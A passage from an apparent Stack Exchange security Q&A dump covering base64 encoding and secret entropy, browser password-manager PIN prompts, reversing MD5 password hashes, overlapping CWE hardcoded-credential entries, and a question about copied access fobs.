However, I thought to my self: doesn't saving a random byte buffer in a base64 encoded string undermine the whole principle of them being 'random bytes'? <strong>Base64 has a charset of only 64 characters while the native <code>crypto.randomBytes.toString()</code> method supports 2^8 = 256 characters.</strong></p>
<p><strong>Ratio</strong><br>
Lets say we have a buffer with length <em>n</em>. For a not-base64-encoded buffer of <em>n</em> the encoded counterpart has the length of <img src=""https://latex.codecogs.com/gif.latex?4%5Bn/3%5D"" alt="""" />, which means a base64 encoded string has a overhead of approximately 133% their non encoded counterpart.</p>
<p>Many of you already know this, but for those who don't know: each base64 character represents 6 bits (<img src=""https://latex.codecogs.com/gif.latex?%5E2log%2864%29%20%3D%206"" alt="""" />).<br>
4 * 6 bits = 12 bits = 3 bytes. this means there are 4 characters encoded for a three byte buffer.</p>
<p>However, I said approximately 133% because the output length is rounded up to a multiple of 4. This means that e.g. 1, 2, 3 bytes become 4 bytes; while 4, 5 and 6 are rounded up to 8 bytes. (this is the trailing <code>=</code> you see on base64 encoded buffers most of the time).<br>
<strong>Thus, the ratio is approximately 1 to 4 thirds (1:1.33)</strong></p>
<p><strong>With the following explaination, what is the smartest thing to do? Saving the buffer itself (short with big charset) or saving the base64 encoded buffer (long with small charset)?<br>Or doesn't it matter for bruteforce applications because the amount of bits is almost the same? Or is base64 even safer because base64 is always 0-2 characters longer?</strong></p>
<pre><code>
const crypto = require('crypto');
const random = crypto.randomBytes(128);
const lenBuffer = random.length;
const lenBase64 = encodeURI(random.toString('base64')).split(/%..|./).length - 1;

console.log(lenBuffer, lenBase64); // 128 172 =&gt; 128 * 1.33 = 170

</code></pre>
<p><strong>Edit:</strong><br>
I might not have been clear in my question, my apologies. My primary question here is - what would be faster to bruteforce, the short and complex byte buffer or the longer and less complex base64 encoded string? According to <a href=""https://www.omnicalculator.com/other/password-entropy"" rel=""nofollow noreferrer"">password entropy</a> the length and complexity are not equally proportional, for they are logaritmic instead.</p>
","5","5","267600","<p>As you say, base64 uses 4/3 times as many symbols to represent the same value.</p>
<p>Each symbol of base64 encodes 6 bits, instead of 8. That's a ratio of 3/4.</p>
<p>(4/3) * (3/4) = 1. The information content is the same.</p>
","17"
"267592","267592","Randomly generated secrets: encoding the random bytes in base64 vs keeping them","<p>Today this came to my attention.<br>
When generating random secrets for e.g. JWT (in node.js the most common way is using the <code>crypto.randomBytes()</code> method), I have noticed <em>a lot</em> of people save these tokens in a base64-encoded manner (i.e. <code>crypto.randomBytes(len).toString('base64')</code>.</p>
<p><strong>Charset</strong><br>
However, I thought to my self: doesn't saving a random byte buffer in a base64 encoded string undermine the whole principle of them being 'random bytes'? <strong>Base64 has a charset of only 64 characters while the native <code>crypto.randomBytes.toString()</code> method supports 2^8 = 256 characters.</strong></p>
<p><strong>Ratio</strong><br>
Lets say we have a buffer with length <em>n</em>. For a not-base64-encoded buffer of <em>n</em> the encoded counterpart has the length of <img src=""https://latex.codecogs.com/gif.latex?4%5Bn/3%5D"" alt="""" />, which means a base64 encoded string has a overhead of approximately 133% their non encoded counterpart.</p>
<p>Many of you already know this, but for those who don't know: each base64 character represents 6 bits (<img src=""https://latex.codecogs.com/gif.latex?%5E2log%2864%29%20%3D%206"" alt="""" />).<br>
4 * 6 bits = 12 bits = 3 bytes. this means there are 4 characters encoded for a three byte buffer.</p>
<p>However, I said approximately 133% because the output length is rounded up to a multiple of 4. This means that e.g. 1, 2, 3 bytes become 4 bytes; while 4, 5 and 6 are rounded up to 8 bytes. (this is the trailing <code>=</code> you see on base64 encoded buffers most of the time).<br>
<strong>Thus, the ratio is approximately 1 to 4 thirds (1:1.33)</strong></p>
<p><strong>With the following explaination, what is the smartest thing to do? Saving the buffer itself (short with big charset) or saving the base64 encoded buffer (long with small charset)?<br>Or doesn't it matter for bruteforce applications because the amount of bits is almost the same? Or is base64 even safer because base64 is always 0-2 characters longer?</strong></p>
<pre><code>
const crypto = require('crypto');
const random = crypto.randomBytes(128);
const lenBuffer = random.length;
const lenBase64 = encodeURI(random.toString('base64')).split(/%..|./).length - 1;

console.log(lenBuffer, lenBase64); // 128 172 =&gt; 128 * 1.33 = 170

</code></pre>
<p><strong>Edit:</strong><br>
I might not have been clear in my question, my apologies. My primary question here is - what would be faster to bruteforce, the short and complex byte buffer or the longer and less complex base64 encoded string? According to <a href=""https://www.omnicalculator.com/other/password-entropy"" rel=""nofollow noreferrer"">password entropy</a> the length and complexity are not equally proportional, for they are logaritmic instead.</p>
","5","5","267614","<p>The binary password has 256^n possibilities, where n is the password length in bytes.</p>
<p>The base64 password has 64^(n*4/3) possibilities, where n is the original password length in bytes and, since the base64 string becomes longer, it's multiplied by 4/3 (as you found out, ignoring potential padding, because you can remove it). We have a smaller base, though (64).</p>
<p>Now,</p>
<pre><code>256^n = 
(2^8)^n = 
2^(8n) = 
2^(4/3*3/4 *8n) =      | 4/3 * 3/4 == 1
2^(3/4*8 * 4/3*n) = 
2^(6* 4/3*n) = 
(2^6)^(4/3*n) = 
64^(4/3*n)
</code></pre>
<p>Qed. The number of possibilities to be brute forced is the same in both cases.</p>
","11"
"267592","267592","Randomly generated secrets: encoding the random bytes in base64 vs keeping them","<p>Today this came to my attention.<br>
When generating random secrets for e.g. JWT (in node.js the most common way is using the <code>crypto.randomBytes()</code> method), I have noticed <em>a lot</em> of people save these tokens in a base64-encoded manner (i.e. <code>crypto.randomBytes(len).toString('base64')</code>.</p>
<p><strong>Charset</strong><br>
However, I thought to my self: doesn't saving a random byte buffer in a base64 encoded string undermine the whole principle of them being 'random bytes'? <strong>Base64 has a charset of only 64 characters while the native <code>crypto.randomBytes.toString()</code> method supports 2^8 = 256 characters.</strong></p>
<p><strong>Ratio</strong><br>
Lets say we have a buffer with length <em>n</em>. For a not-base64-encoded buffer of <em>n</em> the encoded counterpart has the length of <img src=""https://latex.codecogs.com/gif.latex?4%5Bn/3%5D"" alt="""" />, which means a base64 encoded string has a overhead of approximately 133% their non encoded counterpart.</p>
<p>Many of you already know this, but for those who don't know: each base64 character represents 6 bits (<img src=""https://latex.codecogs.com/gif.latex?%5E2log%2864%29%20%3D%206"" alt="""" />).<br>
4 * 6 bits = 12 bits = 3 bytes. this means there are 4 characters encoded for a three byte buffer.</p>
<p>However, I said approximately 133% because the output length is rounded up to a multiple of 4. This means that e.g. 1, 2, 3 bytes become 4 bytes; while 4, 5 and 6 are rounded up to 8 bytes. (this is the trailing <code>=</code> you see on base64 encoded buffers most of the time).<br>
<strong>Thus, the ratio is approximately 1 to 4 thirds (1:1.33)</strong></p>
<p><strong>With the following explaination, what is the smartest thing to do? Saving the buffer itself (short with big charset) or saving the base64 encoded buffer (long with small charset)?<br>Or doesn't it matter for bruteforce applications because the amount of bits is almost the same? Or is base64 even safer because base64 is always 0-2 characters longer?</strong></p>
<pre><code>
const crypto = require('crypto');
const random = crypto.randomBytes(128);
const lenBuffer = random.length;
const lenBase64 = encodeURI(random.toString('base64')).split(/%..|./).length - 1;

console.log(lenBuffer, lenBase64); // 128 172 =&gt; 128 * 1.33 = 170

</code></pre>
<p><strong>Edit:</strong><br>
I might not have been clear in my question, my apologies. My primary question here is - what would be faster to bruteforce, the short and complex byte buffer or the longer and less complex base64 encoded string? According to <a href=""https://www.omnicalculator.com/other/password-entropy"" rel=""nofollow noreferrer"">password entropy</a> the length and complexity are not equally proportional, for they are logaritmic instead.</p>
","5","5","267619","<p>You may be wondering which option is more &quot;secure&quot; if you were to take the output and use it directly as a password in, say, a password field on a website.</p>
<p>In that case, it depends on the brute force attack. A straightforward one that uses every possible input value for length n before moving on to length (n+1), of course the better answer is the longer one; the base64 version. But you could also imagine brute force attacks that don't use really uncommon characters at all, in which case the &quot;raw&quot; one might never be cracked. There isn't a single correct answer here.</p>
<p>Additionally, there are a couple problems:</p>
<ul>
<li>Using the &quot;raw&quot; output isn't &quot;short with big charset&quot; -- it's likely got bytes in it that don't represent valid character data at all. You need to encode the data in <em>some</em> way to actually turn it into a &quot;charset&quot;.</li>
<li>JWT keys aren't used like passwords on a website. As the other answers correctly state, JWT encryption and signing algorithms use the number directly, not the encoded number.</li>
</ul>
","2"
"267592","267592","Randomly generated secrets: encoding the random bytes in base64 vs keeping them","<p>Today this came to my attention.<br>
When generating random secrets for e.g. JWT (in node.js the most common way is using the <code>crypto.randomBytes()</code> method), I have noticed <em>a lot</em> of people save these tokens in a base64-encoded manner (i.e. <code>crypto.randomBytes(len).toString('base64')</code>.</p>
<p><strong>Charset</strong><br>
However, I thought to my self: doesn't saving a random byte buffer in a base64 encoded string undermine the whole principle of them being 'random bytes'? <strong>Base64 has a charset of only 64 characters while the native <code>crypto.randomBytes.toString()</code> method supports 2^8 = 256 characters.</strong></p>
<p><strong>Ratio</strong><br>
Lets say we have a buffer with length <em>n</em>. For a not-base64-encoded buffer of <em>n</em> the encoded counterpart has the length of <img src=""https://latex.codecogs.com/gif.latex?4%5Bn/3%5D"" alt="""" />, which means a base64 encoded string has a overhead of approximately 133% their non encoded counterpart.</p>
<p>Many of you already know this, but for those who don't know: each base64 character represents 6 bits (<img src=""https://latex.codecogs.com/gif.latex?%5E2log%2864%29%20%3D%206"" alt="""" />).<br>
4 * 6 bits = 12 bits = 3 bytes. this means there are 4 characters encoded for a three byte buffer.</p>
<p>However, I said approximately 133% because the output length is rounded up to a multiple of 4. This means that e.g. 1, 2, 3 bytes become 4 bytes; while 4, 5 and 6 are rounded up to 8 bytes. (this is the trailing <code>=</code> you see on base64 encoded buffers most of the time).<br>
<strong>Thus, the ratio is approximately 1 to 4 thirds (1:1.33)</strong></p>
<p><strong>With the following explaination, what is the smartest thing to do? Saving the buffer itself (short with big charset) or saving the base64 encoded buffer (long with small charset)?<br>Or doesn't it matter for bruteforce applications because the amount of bits is almost the same? Or is base64 even safer because base64 is always 0-2 characters longer?</strong></p>
<pre><code>
const crypto = require('crypto');
const random = crypto.randomBytes(128);
const lenBuffer = random.length;
const lenBase64 = encodeURI(random.toString('base64')).split(/%..|./).length - 1;

console.log(lenBuffer, lenBase64); // 128 172 =&gt; 128 * 1.33 = 170

</code></pre>
<p><strong>Edit:</strong><br>
I might not have been clear in my question, my apologies. My primary question here is - what would be faster to bruteforce, the short and complex byte buffer or the longer and less complex base64 encoded string? According to <a href=""https://www.omnicalculator.com/other/password-entropy"" rel=""nofollow noreferrer"">password entropy</a> the length and complexity are not equally proportional, for they are logaritmic instead.</p>
","5","5","267635","<p>Thanks to Lodinn, here is the simplest answer:</p>
<p>If it was easier to crack a base64 encoded key rather than a binary key, then the very first thing an attacker with a binary key would do is to base64-encode it.</p>
","0"
"267588","267588","Why do I need to provide authentication when accessing a browser's built-in password manager?","<p>Why do I have to provide authentication when I want to read a password stored in my own web browser while I have to do nothing to read the same password on a site's login page?</p>
<p>Is my conclusion correct that asking the user for a PIN is pointless and adds nothing to security or am I missing something (please, clarify, how asking for PIN increases security)?</p>
<hr />
<h2>The problem</h2>
<p>When I am using my browser and want to access my stored passwords, I (nearly) always have to authenticate:</p>
<p><a href=""https://i.stack.imgur.com/g7u5Q.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/g7u5Q.png"" alt=""enter image description here"" /></a></p>
<p>But when I am browsing web pages, I don't have to authenticate (or take any other security-related measures) to have the browser provide the site's password:</p>
<p><a href=""https://i.stack.imgur.com/HP3BK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HP3BK.png"" alt=""enter image description here"" /></a></p>
<p>What am I missing? Why is this inconsistent?</p>
<hr />
<p>This question is just for browsers and doesn't correspond to any kind of password manager. What is the point of asking for PIN each and every about 1 minute when I am using the browser's password manager if I can get access to the entire password database without that PIN, by just visiting each and every website stored in that password manager and clicking &quot;Show password&quot; or an eye icon? It is just a few clicks more (per password).</p>
","1","3","267636","<p>I believe this is an attempt to block an unauthorized user with physical access to your computer from accessing the password database to quickly obtain all your passwords at once before you come back from your coffee break.</p>
<p>Any hacker that has the credentials to remotely sign in to your browser will be able to authenticate himself when prompted to reenter the credentials to access the database. So in the case of a remote hacker, this safeguard is useless.</p>
<p>But in a case where a not-too-technically-savvy snooper has physical access to your computer, and wants to physically access your password database, this safeguard will go a long way in protecting your info.</p>
<p>In regards to your questioning what purpose there is to requesting your pin before displaying the password database, this should answer it.</p>
","2"
"267588","267588","Why do I need to provide authentication when accessing a browser's built-in password manager?","<p>Why do I have to provide authentication when I want to read a password stored in my own web browser while I have to do nothing to read the same password on a site's login page?</p>
<p>Is my conclusion correct that asking the user for a PIN is pointless and adds nothing to security or am I missing something (please, clarify, how asking for PIN increases security)?</p>
<hr />
<h2>The problem</h2>
<p>When I am using my browser and want to access my stored passwords, I (nearly) always have to authenticate:</p>
<p><a href=""https://i.stack.imgur.com/g7u5Q.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/g7u5Q.png"" alt=""enter image description here"" /></a></p>
<p>But when I am browsing web pages, I don't have to authenticate (or take any other security-related measures) to have the browser provide the site's password:</p>
<p><a href=""https://i.stack.imgur.com/HP3BK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HP3BK.png"" alt=""enter image description here"" /></a></p>
<p>What am I missing? Why is this inconsistent?</p>
<hr />
<p>This question is just for browsers and doesn't correspond to any kind of password manager. What is the point of asking for PIN each and every about 1 minute when I am using the browser's password manager if I can get access to the entire password database without that PIN, by just visiting each and every website stored in that password manager and clicking &quot;Show password&quot; or an eye icon? It is just a few clicks more (per password).</p>
","1","3","267637","<p>Three reasons. In decreasing order of security importance:</p>
<ol>
<li>The password viewer gives a quick view of all the stored passwords. An attacker who gains access to your unlocked machine probably only has a short window of access, so a screen that lets them quickly display all of the passwords (while, e.g., photographing with their phone) is much more useful to the attacker than manually going to each different site, autofilling the password, and revealing it.</li>
<li>Not all sites offer a mechanism to reveal the password. It's always possible from the developer tools (along with a few other ways to read the value), but that's even more work. Offering the ability to reveal the password is a choice the site developer makes when they're willing to trade away some security for some user convenience. It's not up to the browser developer to make that decision for every site.</li>
<li>Users expect it, and whether a user <em>feels</em> that the product is secure is often much more significant to its success in the marketplace than whether the feature in question actually provides any security. Consider stupid stuff like banks that pop a loading screen (often for much longer than the actual load time) after logging in, which just says &quot;Securing your session&quot; or some such. Or sites that use padlock icons because users associate them with security, even though the icon means literally nothing. There is a definite sense in which this browser &quot;feature&quot; is security theater, but if you spend much time on this site, you will also see plenty of examples of people complaining about, and calling insecure, products that don't implement such security theater. For another example: Chrome on Windows and MacOS uses platform encryption functions to security your cookies, site data, and passwords. On Linux, by default there is no such platform feature, so it &quot;secures&quot; them by encrypting with a hardcoded key. This provides no meaningful security whatsoever, but it means you can't find your cookies in plain text if you search the relevant files on your drive, and people like that.</li>
</ol>
","1"
"267588","267588","Why do I need to provide authentication when accessing a browser's built-in password manager?","<p>Why do I have to provide authentication when I want to read a password stored in my own web browser while I have to do nothing to read the same password on a site's login page?</p>
<p>Is my conclusion correct that asking the user for a PIN is pointless and adds nothing to security or am I missing something (please, clarify, how asking for PIN increases security)?</p>
<hr />
<h2>The problem</h2>
<p>When I am using my browser and want to access my stored passwords, I (nearly) always have to authenticate:</p>
<p><a href=""https://i.stack.imgur.com/g7u5Q.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/g7u5Q.png"" alt=""enter image description here"" /></a></p>
<p>But when I am browsing web pages, I don't have to authenticate (or take any other security-related measures) to have the browser provide the site's password:</p>
<p><a href=""https://i.stack.imgur.com/HP3BK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HP3BK.png"" alt=""enter image description here"" /></a></p>
<p>What am I missing? Why is this inconsistent?</p>
<hr />
<p>This question is just for browsers and doesn't correspond to any kind of password manager. What is the point of asking for PIN each and every about 1 minute when I am using the browser's password manager if I can get access to the entire password database without that PIN, by just visiting each and every website stored in that password manager and clicking &quot;Show password&quot; or an eye icon? It is just a few clicks more (per password).</p>
","1","3","267669","<p>Yes - your conclusion, as well as the other answers, are correct in that the PIN code adds nothing to the security of password storage for a logged in user against certain threats, rather, it's (probably) there to counter opportunistic threats.</p>
<p>Here's some doco to back that up, from <a href=""https://learn.microsoft.com/en-us/deployedge/microsoft-edge-security-password-manager-security"" rel=""nofollow noreferrer"">Microsoft Edge password manager security</a> <em>Aug'22 versions 77+</em> ...</p>
<blockquote>
<p><em>However, physically local attacks and malware are outside the threat model and, under these conditions, encrypted data would be vulnerable. If your computer's infected with malware, an attacker can get decrypted access to the browser's storage areas.</em></p>
</blockquote>
<p>...</p>
<blockquote>
<p><em>However, using a password manager that's keyed to the user’s operating system login session also means that an attacker in that session can immediately retrieve all the user’s saved passwords. Without a password manager to steal from, an adversary would need to track keystrokes or monitor submitted passwords.</em></p>
</blockquote>
<p>... and a bit further on, in the event of data at rest being stolen ...</p>
<blockquote>
<p><em>Despite its inability to protect against full-trust malware, Local Data Encryption is useful in certain scenarios. For example, if an attacker finds a way to steal files from the disk without the ability to execute code or has stolen a laptop that isn’t protected with Full Disk Encryption, Local Data Encryption will make it harder for the thief to get the stored data.</em></p>
</blockquote>
<p>A second document also talks about using the PIN code to guard against opportunistic threats, <a href=""https://support.microsoft.com/en-us/topic/additional-privacy-for-your-saved-passwords-31dbd670-e314-4901-a546-6f302548502e"" rel=""nofollow noreferrer"">Additional privacy for your saved passwords</a> <em>Jul'21</em> (note the word <strong>privacy</strong>) ...</p>
<blockquote>
<p><em>However, this latest update isn't a fix-all. It's very important to understand what this feature can do and what it can't. This is only a basic level of deterrence that provides an additional safeguard for your stored passwords. To best protect the passwords you’ve saved in Microsoft Edge while others are using your device, Microsoft recommends that those users sign in with their own user account on your device.</em></p>
</blockquote>
<p>and</p>
<blockquote>
<p><em>Important: This setting can't guarantee protection against malicious hackers or protect you against a motivated attacker. Malware or keyloggers installed on your device will still be able to read your passwords and attackers who can access your device can also turn off this setting if they know the device password.</em></p>
</blockquote>
<p><strong>PURE SPECULATION</strong> ... it may be that in the future, some additional hardening is to be added to the <em>Edge</em> browser pwd storage... ?</p>
<blockquote>
<p><em>The Microsoft security team has currently rated the impact of a worm that compromises a network of Enterprise PCS (resulting in loss of all credentials in all devices’ password managers) as more severe than the (more likely but lower impact) risk of targeted phishing attacks that compromise a single user-entered credential.</em>
<em>This assessment is under discussion and subject to change with the addition of new security-enhancing features in Microsoft Edge.</em></p>
</blockquote>
<p>and from the second document referenced...</p>
<blockquote>
<p><em>&quot;A peek into the future&quot;</em>
<em>With this helpful first step, you get additional privacy for your passwords stored in Microsoft Edge. However, in certain scenarios where a device is shared among multiple people, the device password is likely known to all of them as well. In such situations, there is greater peace of mind in having password autofill guarded with a dedicated custom password that isn't shared with others. This capability is in the works, and will be brought to Microsoft Edge in the near future.</em></p>
</blockquote>
","0"
"267434","267434","Can I find the MD5 hash key used using input password and output hash?","<p>I was testing a website and found that my password is travelling as a md5 hash over the network and   since it is my password is there any way I can find the key used to hash my password as I have the resulting hashed password and the input password used?</p>
","1","3","267435","<p>You are basically asking to revert an MD5 hash by knowing parts of the input.  The way to do this is to brute force, i.e. try all possible inputs. If this is actually practical depends on the size of the missing input.</p>
","0"
"267434","267434","Can I find the MD5 hash key used using input password and output hash?","<p>I was testing a website and found that my password is travelling as a md5 hash over the network and   since it is my password is there any way I can find the key used to hash my password as I have the resulting hashed password and the input password used?</p>
","1","3","267436","<p>If your question is &quot;Is it possible to restore the password from MD5?&quot;, then the answer is yes. More precisely, there is no way to know what password exactly was used. But it is possible to find some text that produces the same MD5. This may be your password or may be not. In the described scenario this will be sufficient. See <a href=""https://security.stackexchange.com/questions/170789/md5-preimage-vulnerability-in-2017"">details here</a>.</p>
<p>Should you worry? Probably yes:</p>
<ul>
<li>If they store this MD5 directly in their database, then it is a security risk, because MD5 can be brute-forced.</li>
<li>Even if they don't store this MD5 directly, but let say wrap it into <em>bcrypt</em> or other algorithm, there is a risk of password shucking, see <a href=""https://crypto.stackexchange.com/questions/103446/sending-password-to-server-vs-sending-sha/103451"">details here</a>. If the same password is used for more than one web site, then despite resource intensive methods like <em>bcrypt</em> or <em>Argon2</em> the password can be restored, because instead of brute-forcing only the leaked MD5 candidates would be tested.</li>
</ul>
","0"
"267434","267434","Can I find the MD5 hash key used using input password and output hash?","<p>I was testing a website and found that my password is travelling as a md5 hash over the network and   since it is my password is there any way I can find the key used to hash my password as I have the resulting hashed password and the input password used?</p>
","1","3","267437","<p>If the MD5 doesn't match a straightforward <code>md5($password)</code> then you <em>might</em> be able to find out what's being done to it by trying to brute-force the hash. But you're unlikely to succeed unless they're doing something very simple.</p>
<p>The much better solution is to investigate the client-side (JavaScript) code to see what happens to your password when you enter it and make the login request. You might be able to do this by statically analysing the code, or you might have to debug it (modern browsers have pretty powerful debugging tools) to see what's happening.</p>
","0"
"267416","267416","Why are there multiple ""Hardcoded Password"" Entries in CWE instead of single one?","<p>When I looked up hardcoded password vulnerability in software world, I saw there are three kinds of vulnerabilities. These are that:</p>
<p><a href=""https://cwe.mitre.org/data/definitions/798.html"" rel=""nofollow noreferrer"">CWE-798: Use of Hard-coded Credentials</a></p>
<blockquote>
<p>The Hardcoded Creds vulnerability definition:</p>
<p>&quot;The software contains hard-coded credentials, such as a password or
cryptographic key, which it uses for its own inbound authentication,
outbound communication to external components, or encryption of
internal data.&quot;</p>
</blockquote>
<p><a href=""https://cwe.mitre.org/data/definitions/259.html"" rel=""nofollow noreferrer"">CWE-259: Use of Hard-coded Password</a></p>
<blockquote>
<p>The Hardcoded Password vulnerability definition:</p>
<p>&quot;The software contains a hard-coded password, which it uses for its
own inbound authentication or for outbound communication to external
components.&quot;</p>
</blockquote>
<p><a href=""https://cwe.mitre.org/data/definitions/260.html"" rel=""nofollow noreferrer"">CWE-260: Password in Configuration File</a></p>
<blockquote>
<p>Password in Config vulnerability definition:</p>
<p>&quot;The software stores a password in a configuration file that might be
accessible to actors who do not know the password.&quot;</p>
</blockquote>
<p>When I investigate these cwe pages, I am fully confused. Because the CWE-798 and CWE-259 gives same vulnerable code snippets exactly as an example. I mean both of these vulnerabilities looks like same.</p>
<p>In addition, CWE-798 and CWE-259 give vulnerable config code snippets as an example that take place in CWE-260 at the same time.</p>
<p>Can someone explain why all of these cwe entries aren't a single entry? What are the differences between these entries?</p>
","5","3","267417","<p>It's different things.</p>
<p>CWE-260 talks about storing the authentication credential in clear text in a configuration file, so that an attacker can learn it.</p>
<p>CWE-259 talks about <em>using</em> hardcoded passwords for incoming or outgoing communication. Note that this hardcoded password need not be configurable, nor stored in plain text. It can be a hash in the source code that's compiled into a binary.</p>
<p>CWE-798 widens this to include any kind of credential used for authentication or encryption, even if for encrypting data at rest.</p>
<p>It could be argued that CWE-798 covers CWE-259 as well. But CWE-260 is a <em>distinct</em> type where the credential is stored in a configuration file.</p>
","4"
"267416","267416","Why are there multiple ""Hardcoded Password"" Entries in CWE instead of single one?","<p>When I looked up hardcoded password vulnerability in software world, I saw there are three kinds of vulnerabilities. These are that:</p>
<p><a href=""https://cwe.mitre.org/data/definitions/798.html"" rel=""nofollow noreferrer"">CWE-798: Use of Hard-coded Credentials</a></p>
<blockquote>
<p>The Hardcoded Creds vulnerability definition:</p>
<p>&quot;The software contains hard-coded credentials, such as a password or
cryptographic key, which it uses for its own inbound authentication,
outbound communication to external components, or encryption of
internal data.&quot;</p>
</blockquote>
<p><a href=""https://cwe.mitre.org/data/definitions/259.html"" rel=""nofollow noreferrer"">CWE-259: Use of Hard-coded Password</a></p>
<blockquote>
<p>The Hardcoded Password vulnerability definition:</p>
<p>&quot;The software contains a hard-coded password, which it uses for its
own inbound authentication or for outbound communication to external
components.&quot;</p>
</blockquote>
<p><a href=""https://cwe.mitre.org/data/definitions/260.html"" rel=""nofollow noreferrer"">CWE-260: Password in Configuration File</a></p>
<blockquote>
<p>Password in Config vulnerability definition:</p>
<p>&quot;The software stores a password in a configuration file that might be
accessible to actors who do not know the password.&quot;</p>
</blockquote>
<p>When I investigate these cwe pages, I am fully confused. Because the CWE-798 and CWE-259 gives same vulnerable code snippets exactly as an example. I mean both of these vulnerabilities looks like same.</p>
<p>In addition, CWE-798 and CWE-259 give vulnerable config code snippets as an example that take place in CWE-260 at the same time.</p>
<p>Can someone explain why all of these cwe entries aren't a single entry? What are the differences between these entries?</p>
","5","3","267419","<p>I think the answer to the <em>why</em> question is that...</p>
<blockquote>
<p><a href=""https://cwe.mitre.org/index.html"" rel=""noreferrer"">CWE™</a> is a <strong>community-developed</strong> list of software and hardware weakness types.</p>
</blockquote>
<p>It is an indicative tool rather than an authority for vulnerability classification.</p>
<p>All the mentioned CWEs are also linked to each other through their parent CWEs:</p>
<ul>
<li><a href=""https://cwe.mitre.org/data/definitions/284.html"" rel=""noreferrer"">CWE-284: Improper Access Control</a>
<ul>
<li>MemberOf   View    <a href=""https://cwe.mitre.org/data/definitions/1000.html"" rel=""noreferrer"">1000   Research Concepts</a></li>
<li>ParentOf   Class   <a href=""https://cwe.mitre.org/data/definitions/287.html"" rel=""noreferrer"">287    Improper Authentication</a>
<ul>
<li>ParentOf Class   <a href=""https://cwe.mitre.org/data/definitions/1390.html"" rel=""noreferrer"">1390   Weak Authentication</a>
<ul>
<li>ParentOf Class <a href=""https://cwe.mitre.org/data/definitions/522.html"" rel=""noreferrer"">522    Insufficiently Protected Credentials</a>
<ul>
<li>ParentOf Base <a href=""https://cwe.mitre.org/data/definitions/260.html"" rel=""noreferrer""><strong>260</strong> Password in Configuration File</a></li>
</ul>
</li>
<li>ParentOf Class <a href=""https://cwe.mitre.org/data/definitions/1391.html"" rel=""noreferrer"">1391 Use of Weak Credentials</a>
<ul>
<li>ParentOf Base <a href=""https://cwe.mitre.org/data/definitions/798.html"" rel=""noreferrer""><strong>798</strong> Use of Hard-coded Credentials</a>
<ul>
<li>ParentOf Variant <a href=""https://cwe.mitre.org/data/definitions/259.html"" rel=""noreferrer""><strong>259</strong> Use of Hard-coded Password</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>However, the links are not exclusive, as any CWE could have multiple children and also multiple parents. It might be a good idea to make more direct relationships between CWEs that share common examples.</p>
<p>Furthermore, as all the CWEs are part of <a href=""https://cwe.mitre.org/data/definitions/1000.html"" rel=""noreferrer"">CWE VIEW: Research Concepts</a>, one must take into consideration</p>
<ul>
<li><p>their general objective</p>
<blockquote>
<p>This view is intended to facilitate research into weaknesses, including their inter-dependencies, and can be leveraged to systematically identify theoretical gaps within CWE. It is mainly organized according to abstractions of behaviors instead of how they can be detected, where they appear in code, or when they are introduced in the development life cycle. By design, this view is expected to include every weakness within CWE.</p>
</blockquote>
</li>
<li><p>the relationship types</p>
<blockquote>
<p><strong>Classes</strong> are still very abstract, typically independent of any specific language or technology.</p>
</blockquote>
<blockquote>
<p><strong>Base</strong> level weaknesses are used to present a more specific type of weakness.</p>
</blockquote>
<blockquote>
<p>A <strong>variant</strong> is a weakness that is described at a very low level of detail, typically limited to a specific language or technology.</p>
</blockquote>
</li>
</ul>
","8"
"267416","267416","Why are there multiple ""Hardcoded Password"" Entries in CWE instead of single one?","<p>When I looked up hardcoded password vulnerability in software world, I saw there are three kinds of vulnerabilities. These are that:</p>
<p><a href=""https://cwe.mitre.org/data/definitions/798.html"" rel=""nofollow noreferrer"">CWE-798: Use of Hard-coded Credentials</a></p>
<blockquote>
<p>The Hardcoded Creds vulnerability definition:</p>
<p>&quot;The software contains hard-coded credentials, such as a password or
cryptographic key, which it uses for its own inbound authentication,
outbound communication to external components, or encryption of
internal data.&quot;</p>
</blockquote>
<p><a href=""https://cwe.mitre.org/data/definitions/259.html"" rel=""nofollow noreferrer"">CWE-259: Use of Hard-coded Password</a></p>
<blockquote>
<p>The Hardcoded Password vulnerability definition:</p>
<p>&quot;The software contains a hard-coded password, which it uses for its
own inbound authentication or for outbound communication to external
components.&quot;</p>
</blockquote>
<p><a href=""https://cwe.mitre.org/data/definitions/260.html"" rel=""nofollow noreferrer"">CWE-260: Password in Configuration File</a></p>
<blockquote>
<p>Password in Config vulnerability definition:</p>
<p>&quot;The software stores a password in a configuration file that might be
accessible to actors who do not know the password.&quot;</p>
</blockquote>
<p>When I investigate these cwe pages, I am fully confused. Because the CWE-798 and CWE-259 gives same vulnerable code snippets exactly as an example. I mean both of these vulnerabilities looks like same.</p>
<p>In addition, CWE-798 and CWE-259 give vulnerable config code snippets as an example that take place in CWE-260 at the same time.</p>
<p>Can someone explain why all of these cwe entries aren't a single entry? What are the differences between these entries?</p>
","5","3","267445","<p>CWE-259 and CWE-260 were added on 2006-07-19, and originated from the <a href=""https://cwe.mitre.org/documents/sources/SevenPerniciousKingdoms.pdf"" rel=""noreferrer"">7 Pernicious Kingdoms</a>, a very <a href=""https://www.c-sharpcorner.com/article/the-seven-pernicious-kingdoms/"" rel=""noreferrer"">early attempt</a> to provide a taxonomy for vulnerabilities.</p>
<p>Meanwhile, the Internet evolved.</p>
<p>CWE-798 was added on 2010-01-15 by MITRE, with the rationale:</p>
<blockquote>
<p>More abstract entry for hard-coded password and hard-coded cryptographic key.</p>
</blockquote>
<p>So what we learned in the 4 years between them is that 259 and 260 weren't comprehensive enough, and indeed <em>too specific</em>, so a more general term was added.</p>
<p>However, we can't just remove them, because in those four years there were backlinks made to 259 and 260, and it doesn't really do any harm to keep them: except for confusion, of course.</p>
<p>But the CWE itself is not well-architected (in my opinion) and could do with some overall refinements to make current relevant threats more accessible and historical ones less prominent.</p>
","5"
"267397","267397","Can a security system detect there are multiple copies of a single-issued fob?","<p>My building gave me a single fob. I made 3 copies of it for my family and they all opened the building entrance but not my actual apartment door, until one day the building told me they had noticed I had made copies of the fobs which was not allowed. They gave me a new fob and all previous fobs stopped working. How did they find out? And why did the copies not open my apartment door? It's one of those droplet-shaped thin fobs.</p>
